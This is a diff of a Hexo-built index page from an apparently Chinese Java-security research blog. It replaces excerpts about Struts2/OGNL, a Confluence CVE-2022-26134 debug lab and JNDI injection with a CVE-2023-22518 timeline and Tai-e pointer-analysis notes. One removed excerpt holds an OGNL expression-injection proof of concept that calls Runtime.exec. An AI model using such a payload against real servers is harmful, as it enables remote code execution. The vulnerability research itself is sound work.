@@ -45,7 +45,7 @@ ga('send', 'pageview');
 
   
 
-<meta name="generator" content="Hexo 5.2.0"></head>
+<meta name="generator" content="Hexo 5.4.2"></head>
 
 <body>
   <div id="container" q-class="show:isCtnShow">
@@ -171,147 +171,37 @@ ga('send', 'pageview');
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-Struts2系列一：OGNL 表达式" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Confluence-CVE-2023-22518-漏洞分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/07/11/Struts2%E7%B3%BB%E5%88%97%E4%B8%80%EF%BC%9AOGNL%20%E8%A1%A8%E8%BE%BE%E5%BC%8F/">Struts2系列一：OGNL 表达式</a>
+      <a class="article-title" href="/2023/11/01/Confluence-CVE-2023-22518-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Confluence CVE-2023-22518 漏洞分析</a>
     </h1>
   
 
         
-        <a href="/2022/07/11/Struts2%E7%B3%BB%E5%88%97%E4%B8%80%EF%BC%9AOGNL%20%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="archive-article-date">
-  	<time datetime="2022-07-11T08:27:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-07-11</time>
+        <a href="/2023/11/01/Confluence-CVE-2023-22518-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="archive-article-date">
+  	<time datetime="2023-11-01T02:18:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-11-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>最近在复盘confluence CVE-2022-26134 这个漏洞，发现根本原因还是Struts2 架构的问题，这块的知识点挺多，不是一篇文章能解释清楚的，因此准备搞个系列，理理Struts2 架构相关的漏洞及原理。</p>
-<ul>
-<li>Ognl</li>
-<li>velocity</li>
-<li>Struts2</li>
-<li>Confluence</li>
+        <h2 id="0x01-漏洞时间线"><a href="#0x01-漏洞时间线" class="headerlink" title="0x01 漏洞时间线"></a>0x01 漏洞时间线</h2><ul>
+<li>10月16日 长亭安全研究员发现该漏洞</li>
+<li>10月31日 官方发布新版本修复漏洞</li>
+<li>10月31日 17:59 长亭安全应急响应中心发布通告</li>
+<li>10月31日 18:50 beichen 已经复现<br>  <img src="/images/pasted-813.png" alt="upload successful"><br>  <img src="/images/pasted-814.png" alt="upload successful"></li>
+<li>10月31日 threedream师傅疑问，beichen确认  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">假设存在URL为/barspace/bar.action的请求，而且/barspace的命名空间下没有名为bar的Action，则默认命名空间下名为bar的Action也会处理用户请求。但根命名空间下的Action仅仅处理根命名空间下的Action的请求，这是根命名空间和默认命名空间的差别。</span><br><span class="line"></span><br><span class="line">   命名空间仅仅有一个级别。假设请求的URL是/bookservice/search/get.action。系统将先在/bookservice/search的命名空间下查找名为get的Action，假设在该命名空间内找到名为get的Action。则由该Action处理用户的请求。假设未找到。系统将直接进入默认的命名空间中查找名为get的Action，而不会在/bookservice的命名空间下查找名为get的Action 。</span><br></pre></td></tr></table></figure>
+
+</li>
 </ul>
-<h2 id="Ox01-基础知识"><a href="#Ox01-基础知识" class="headerlink" title="Ox01 基础知识"></a>Ox01 基础知识</h2><p>参考【1】中R17a 已经有整理了相关的OGNL相关基础知识，这里不做深入介绍，简单罗列下知识点。</p>
-<ol>
-<li>expression 表达式、相关语法    </li>
-<li>context 上下文</li>
-<li>root 对象</li>
-</ol>
-<h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><h3 id="2-1-生成AST树"><a href="#2-1-生成AST树" class="headerlink" title="2.1 生成AST树"></a>2.1 生成AST树</h3><p>以以下poc为例</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ognl.getValue(<span class="string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;open -a Calculator&#x27;)&quot;</span>, context, context.getRoot());</span><br></pre></td></tr></table></figure>
         
-          <a class="article-more-a" href="/2022/07/11/Struts2%E7%B3%BB%E5%88%97%E4%B8%80%EF%BC%9AOGNL%20%E8%A1%A8%E8%BE%BE%E5%BC%8F/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">OGNL</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Struts2</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Java安全//" class="article-tag-list-link color2">Java安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-
-  
-    <article id="post-Confluence-CVE-2022-26134-OGNL-分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/06/10/Confluence-CVE-2022-26134-OGNL-%E5%88%86%E6%9E%90/">Confluence CVE-2022-26134 OGNL 分析</a>
-    </h1>
-  
-
-        
-        <a href="/2022/06/10/Confluence-CVE-2022-26134-OGNL-%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2022-06-10T06:20:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- 日拱一卒，功不唐捐。-->
-
-<p>发现半年没写文章了。。。</p>
-<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>P🐮的Vulhub 有镜像了，不过调试接口没有开出来，这里稍微补充下。</p>
-<p>在vulhub/confluence/CVE2022-26134 目录下</p>
-<ol>
-<li>新建Dockerfile</li>
-</ol>
-<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> vulhub/confluence:<span class="number">7.13</span>.<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed <span class="string">&quot;106 iCATALINA_OPTS=\&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 \$\&#123;CATALINA_OPTS\&#125;\&quot;&quot;</span> -i /opt/atlassian/confluence/bin/setenv.sh</span></span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>更新docker-compose.yml</li>
-</ol>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">build:</span> <span class="string">.</span></span><br><span class="line"><span class="comment"># image: vulhub/confluence:7.13.6</span></span><br><span class="line"><span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;8090:8090&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;5005:5005&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2022/06/10/Confluence-CVE-2022-26134-OGNL-%E5%88%86%E6%9E%90/#more">more >></a>
+          <a class="article-more-a" href="/2023/11/01/Confluence-CVE-2023-22518-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#more">more >></a>
         
       
 
@@ -329,7 +219,7 @@ ga('send', 'pageview');
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">OGNL</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">CVE-2023-22518</a>
         		</li>
       		
 		</ul>
@@ -381,36 +271,39 @@ ga('send', 'pageview');
 
 
   
-    <article id="post-JNDI-RMI-LDAP注入绕过逆向分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Tai-e-指针分析之反射算法Solar分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/17/JNDI-RMI-LDAP%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">JNDI-RMI 注入的EL 绕过思路分析</a>
+      <a class="article-title" href="/2023/10/09/Tai-e-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E4%B9%8B%E5%8F%8D%E5%B0%84%E7%AE%97%E6%B3%95Solar%E5%88%86%E6%9E%90/">Tai-e 指针分析之反射算法Solar分析</a>
     </h1>
   
 
         
-        <a href="/2021/12/17/JNDI-RMI-LDAP%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2021-12-17T06:11:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-17</time>
+        <a href="/2023/10/09/Tai-e-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E4%B9%8B%E5%8F%8D%E5%B0%84%E7%AE%97%E6%B3%95Solar%E5%88%86%E6%9E%90/" class="archive-article-date">
+  	<time datetime="2023-10-09T08:57:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-10-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><img src="/images/pasted-203.png" alt="upload successful"></p>
-<p>上面的JNDI 注入的JDK 版本限制已经耳熟能详了，针对JNDI-RMI 的tomcat EL 绕过姿势也被经常提起，本文尝试回溯这一姿势的发现过程。</p>
-<h2 id="JNDI-RMI-注入"><a href="#JNDI-RMI-注入" class="headerlink" title="JNDI-RMI 注入"></a>JNDI-RMI 注入</h2><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>必须了解两个重要的类</p>
-<ul>
-<li>com.sun.jndi.rmi.registry.RegistryContext： JNDI-RMI接口</li>
-<li>java.rmi.registry.Registry： RMI 接口</li>
+        <h1 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h1><p>如谭老师参考【4】中的《Java指针分析综述》一文中对于Java反射的静态分析研究简述：</p>
+<ol>
+<li>Livshits 借助指针分析解析反射关键API的字符串参数进而分析出反射调用的副作用，简称字符串分析方法。</li>
+<li>谭、李老师提出的Elf 方案，思路大致是不依赖调用参数必须是字符串常量，而是根据其他信息，比如反射调用的参数类型、返回值的向下类型转换等。</li>
+<li>还是谭、李老师推出的Solar 方案，不是很懂，原文复述下<ul>
+<li>集体推导技术(collective inference)</li>
+<li>懒惰堆建模(lazy heap modeling)， 懒惰堆建模用于分析由反射调用Class.newInstance()或 Constructor.newInstance()创建但具体类型在创建点未知的堆对象。对于这类对象，Solar 将其传播到程序中使用它们的位置，如向下类型转换，或Method.invoke()、Field.get()、Field.set()的反射调用点等，并更充分地利用程序中这些位置的类型信息以分析反射创建对象的具体类型。</li>
 </ul>
-<p>通常攻击场景下，Registry是作为RMI服务端，RegistryContext是作为攻击的client端，也就是vuln。</p>
+</li>
+</ol>
+<h1 id="0x02-Tai-e-Solar"><a href="#0x02-Tai-e-Solar" class="headerlink" title="0x02 Tai-e Solar"></a>0x02 Tai-e Solar</h1><h2 id="2-1-Invoke-Demo-Code"><a href="#2-1-Invoke-Demo-Code" class="headerlink" title="2.1 Invoke Demo Code"></a>2.1 Invoke Demo Code</h2><p>先准备待测试程序InvokeDemo</p>
         
-          <a class="article-more-a" href="/2021/12/17/JNDI-RMI-LDAP%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/#more">more >></a>
+          <a class="article-more-a" href="/2023/10/09/Tai-e-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E4%B9%8B%E5%8F%8D%E5%B0%84%E7%AE%97%E6%B3%95Solar%E5%88%86%E6%9E%90/#more">more >></a>
         
       
 
@@ -424,11 +317,7 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">JNDI</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">RMI</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Tai-e</a>
         		</li>
       		
 		</ul>
@@ -440,7 +329,7 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/Java安全//" class="article-tag-list-link color2">Java安全</a>
+        			<a href="/categories/静态分析//" class="article-tag-list-link color5">静态分析</a>
         		</li>
       		
 		</ul>
@@ -476,38 +365,421 @@ ga('send', 'pageview');
 
 
   
-    <article id="post-CodeQL-CVE-2021-2471" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Tai-e-指针分析初探" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/01/CodeQL-CVE-2021-2471/">CodeQL with CVE-2021-2471</a>
+      <a class="article-title" href="/2023/10/09/Tai-e-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/">Tai-e 指针分析PTA初探</a>
     </h1>
   
 
         
-        <a href="/2021/11/01/CodeQL-CVE-2021-2471/" class="archive-article-date">
-  	<time datetime="2021-11-01T13:19:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-01</time>
+        <a href="/2023/10/09/Tai-e-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/" class="archive-article-date">
+  	<time datetime="2023-10-09T07:06:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-10-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>pyn3rd师傅的《Make JDBC Attack Brilliant Again》中有一个0day是mysql jdbc xxe，thread3am师傅也早就复现出来了，而且还发现了h2的xxe。膜一个，师傅们都太🐂🍺了。很多师傅们也复现了，再讲也没啥意思了，用CodeQL整点新的吧。</p>
+        <p>了解了IR，再来了解下最常用的PTA 指针分析是如何实现的。</p>
+<h1 id="0x01-指针分析PTA原理"><a href="#0x01-指针分析PTA原理" class="headerlink" title="0x01 指针分析PTA原理"></a>0x01 指针分析PTA原理</h1><h2 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1 定义"></a>1.1 定义</h2><p><img src="/images/pasted-767.png" alt="upload successful"></p>
+<blockquote>
+<p>我们将分析一个指针可能指向的内存区域（Memory Location），以程序（Program）为输入，以程序中的指向关系（Point-to Relation）为输出的分析称作指针分析（Pointer Analysis）。</p>
+</blockquote>
+<p>这里先看简单的上下文不敏感的分析，举例说明</p>
+<p>有个程序，求解运行foo()之后的变量/字段指向关系</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    B b;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setB</span><span class="params">(B b)</span> &#123; <span class="built_in">this</span>.b = b; &#125;</span><br><span class="line">    B <span class="title function_">getB</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.b; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">    <span class="type">B</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">    a.setB(x);</span><br><span class="line">    <span class="type">B</span> <span class="variable">y</span> <span class="operator">=</span> a.getB();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="/images/pasted-768.png" alt="upload successful"></p>
+<p>注：</p>
+<ul>
+<li>此处是上下文不敏感分析</li>
+</ul>
+<h2 id="1-2-指针分析的关键因素"><a href="#1-2-指针分析的关键因素" class="headerlink" title="1.2 指针分析的关键因素"></a>1.2 指针分析的关键因素</h2><p><img src="/images/pasted-769.png" alt="upload successful"></p>
+<p>这里仅做提及，后续再详细分析。</p>
+<h2 id="1-3-上下文敏感的指针分析算法"><a href="#1-3-上下文敏感的指针分析算法" class="headerlink" title="1.3 上下文敏感的指针分析算法"></a>1.3 上下文敏感的指针分析算法</h2><p><img src="/images/pasted-770.png" alt="upload successful"></p>
+<p>指针分析这块原理很多，只是捡了几个重点的贴出来，强烈建议去看两位老师的课件。</p>
+<h1 id="0x02-Tai-e-IR"><a href="#0x02-Tai-e-IR" class="headerlink" title="0x02 Tai-e IR"></a>0x02 Tai-e IR</h1><p>在前面一文《Tai-e 分析之IR》中，我们跟踪了Tai-e 是如何利用Soot，再通过Transfrom和各种Converter build Tai-e自己的IR。</p>
+<p>IR是整个PTA分析的前提。</p>
+<p>这里单独讲讲几个重要的基础IR。</p>
+<h2 id="2-1-Var-IR"><a href="#2-1-Var-IR" class="headerlink" title="2.1 Var IR"></a>2.1 Var IR</h2><p>Tai-e的Var IR也有些特殊，在Var初始化的时候，会生成相关的Var属性</p>
+<ul>
+<li>method: 所属method</li>
+<li>name</li>
+<li>type</li>
+<li>index</li>
+<li>constValue</li>
+<li>relevantStmts: 存储该Var相关的特殊stmts<ul>
+<li>loadFields</li>
+<li>storeFields</li>
+<li>loadArrays</li>
+<li>storeArrays</li>
+<li>invokes<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* Relevant statements of a variable, say v, which include:</span><br><span class="line">* load field: x = v.f;</span><br><span class="line">* store field: v.f = x;</span><br><span class="line">* load array: x = v[i];</span><br><span class="line">* store array: v[i] = x;</span><br><span class="line">* invocation: v.f();</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+</li>
+</ul>
+<p>其中的relevantStmts是该Var相关的一些特殊Stmt，方便后续的程序分析。</p>
+<p>居然是在这一步做的。</p>
+<p>在后续的分析中，会获取Var相关Field，比如StoreFiled的逻辑：</p>
+<p>Var</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;StoreField&gt; <span class="title function_">getStoreFields</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> relevantStmts.getStoreFields();</span><br><span class="line">&#125;</span><br><span class="line">Var$RelevantStmts</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;StoreField&gt; <span class="title function_">getStoreFields</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> unmodifiable(storeFields);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重点讲解下Var$RelevantStmts内部类。</p>
+<p><img src="/images/pasted-771.png" alt="upload successful"></p>
+<blockquote>
+<p>疑问：relevantStmts是IR的时候就已经关联上了，还是在后续分析的时候关联上的?</p>
+</blockquote>
+<p>答案是IR build的时候，其构建过程如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">addStoreField:172, Var (pascal.taie.ir.exp)</span><br><span class="line">&lt;init&gt;:42, StoreField (pascal.taie.ir.stmt)</span><br><span class="line">caseAssignStmt:605, MethodIRBuilder (pascal.taie.frontend.soot)</span><br><span class="line">apply:217, JAssignStmt (soot.jimple.internal)</span><br><span class="line">lambda$buildStmts$1:251, MethodIRBuilder (pascal.taie.frontend.soot)</span><br><span class="line">accept:-1, MethodIRBuilder$$Lambda$244/0x0000000800ebcf78 (pascal.taie.frontend.soot)</span><br><span class="line">forEach:75, Iterable (java.lang)</span><br><span class="line">buildStmts:251, MethodIRBuilder (pascal.taie.frontend.soot)</span><br><span class="line">build:226, MethodIRBuilder (pascal.taie.frontend.soot)</span><br><span class="line">buildIR:53, IRBuilder (pascal.taie.frontend.soot)</span><br><span class="line">getIR:192, JMethod (pascal.taie.language.classes)</span><br><span class="line">addEntryPoint:788, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">onStart:65, EntryPointHandler (pascal.taie.analysis.pta.plugin)</span><br><span class="line">accept:-1, CompositePlugin$$Lambda$311/0x0000000800ef0820 (pascal.taie.analysis.pta.plugin)</span><br><span class="line">forEach:1511, ArrayList (java.util)</span><br><span class="line">onStart:99, CompositePlugin (pascal.taie.analysis.pta.plugin)</span><br><span class="line">initialize:265, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">solve:245, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">runAnalysis:119, PointerAnalysis (pascal.taie.analysis.pta)</span><br><span class="line">analyze:107, PointerAnalysis (pascal.taie.analysis.pta)</span><br><span class="line">analyze:64, PointerAnalysis (pascal.taie.analysis.pta)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-772.png" alt="upload successful"><br>此刻unit为Soot的JAssignStmt，其apply会调用caseAssignStmt 接口</p>
+<p><img src="/images/pasted-773.png" alt="upload successful"><br>lhs属于FieldRef，因此最终会将storeField stm添加在该Var IR的relevantStmts属性中。</p>
+<h1 id="0x03-PTA-数据结构"><a href="#0x03-PTA-数据结构" class="headerlink" title="0x03 PTA 数据结构"></a>0x03 PTA 数据结构</h1><h2 id="3-1-CSVar"><a href="#3-1-CSVar" class="headerlink" title="3.1 CSVar"></a>3.1 CSVar</h2><p>CSVar 可以简单理解成PTA分析结果“指向关系图”中的变量/属性。<br>它是上下文敏感的Var，其中Var是Tai-e IR概念，其有以下字段</p>
+<ul>
+<li>var: 对应的IR Var</li>
+<li>context: 上下文</li>
+<li>pointToSet: 指向的值的集合</li>
+<li>index</li>
+<li>successors</li>
+<li>outEdges</li>
+<li>filters<br><img src="/images/pasted-774.png" alt="upload successful"></li>
+</ul>
+<p>如上图，其中红框中的n1\n2等，就是CSVar。</p>
+<p>在后文的重要结构workList。pointerEntries中，其key就大部分是CSVar</p>
+<p><img src="/images/pasted-775.png" alt="upload successful"></p>
+<h2 id="3-2-PointToSet"><a href="#3-2-PointToSet" class="headerlink" title="3.2 PointToSet"></a>3.2 PointToSet</h2><p>PointToSet 是CSVar的可能值集合。CSVar中自带也有pointToSet属性。</p>
+<p>它的Set的值是CSObj类型（堆敏感值，后续上下文敏感分析再细讲）。</p>
+<p><img src="/images/pasted-776.png" alt="upload successful"><br>同样的，如上图，其中”{}”大括号内的就是PointToSet，比如o1、o2。</p>
+<h2 id="3-3-WorkList"><a href="#3-3-WorkList" class="headerlink" title="3.3 WorkList"></a>3.3 WorkList</h2><p>WorkList 是在DefaultSolver中的重要变量，是整个指针分析的核心。</p>
+<p>它内部存在着待分析的pointerEntries和callEdges，整个指针分析的核心逻辑就是从WorkList队列中出取值，进行处理，处理期间也可能会对WorkList进行入队列，直至WorkList 为空，停止分析。</p>
+<h3 id="3-3-1-pointerEntries"><a href="#3-3-1-pointerEntries" class="headerlink" title="3.3.1 pointerEntries"></a>3.3.1 pointerEntries</h3><p>pointEntry 通常由一组（CSVar、PointToSet）组成，其入队列的api为</p>
+<p>DefaultSolve#addPointsTo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addPointsTo</span><span class="params">(Pointer pointer, PointsToSet pts)</span> &#123;</span><br><span class="line">    workList.addEntry(pointer, pts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-3-2-callEdges"><a href="#3-3-2-callEdges" class="headerlink" title="3.3.2 callEdges"></a>3.3.2 callEdges</h3><p>在队列中具有高优先级，优先处理这一类元素。</p>
+<p>同样的，其api为DefaultSolve#addCallEdge</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCallEdge</span><span class="params">(Edge&lt;CSCallSite, CSMethod&gt; edge)</span> &#123;</span><br><span class="line">    workList.addEntry(edge);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04-PTA流程跟踪"><a href="#0x04-PTA流程跟踪" class="headerlink" title="0x04 PTA流程跟踪"></a>0x04 PTA流程跟踪</h1><p>PTA分析包装在PointerAnalysis（在pascal.taie.analysis.pta）， 我们从这里开始跟踪。</p>
+<h2 id="4-1-AnalysisManager"><a href="#4-1-AnalysisManager" class="headerlink" title="4.1 AnalysisManager"></a>4.1 AnalysisManager</h2><p>在进入PointerAnalysis 之前，还由AnalysisManager包了一层。我们在前文《Tai-e 初探》 中有提到Tai-e 有很多程序分析功能，PTA只是其中一个。</p>
+<p>AnalysisManager 就是这一层的封装，对应的调用栈如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">analyze:64, PointerAnalysis (pascal.taie.analysis.pta)</span><br><span class="line">runProgramAnalysis:148, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">runAnalysis:135, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">lambda$execute$0:104, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">get:-1, AnalysisManager$$Lambda$227/0x0000000800ea3010 (pascal.taie.analysis)</span><br><span class="line">runAndCount:93, Timer (pascal.taie.util)</span><br><span class="line">lambda$execute$1:103, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">accept:-1, AnalysisManager$$Lambda$226/0x0000000800ea2bb8 (pascal.taie.analysis)</span><br><span class="line">forEach:1511, ArrayList (java.util)</span><br><span class="line">execute:102, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">executePlan:152, Main (pascal.taie)</span><br><span class="line">lambda$main$0:61, Main (pascal.taie)</span><br><span class="line">run:-1, Main$$Lambda$109/0x0000000800d2b000 (pascal.taie)</span><br><span class="line">lambda$runAndCount$0:112, Timer (pascal.taie.util)</span><br><span class="line">get:-1, Timer$$Lambda$110/0x0000000800d2b458 (pascal.taie.util)</span><br><span class="line">runAndCount:93, Timer (pascal.taie.util)</span><br><span class="line">runAndCount:111, Timer (pascal.taie.util)</span><br><span class="line">runAndCount:107, Timer (pascal.taie.util)</span><br><span class="line">main:52, Main (pascal.taie)</span><br></pre></td></tr></table></figure>
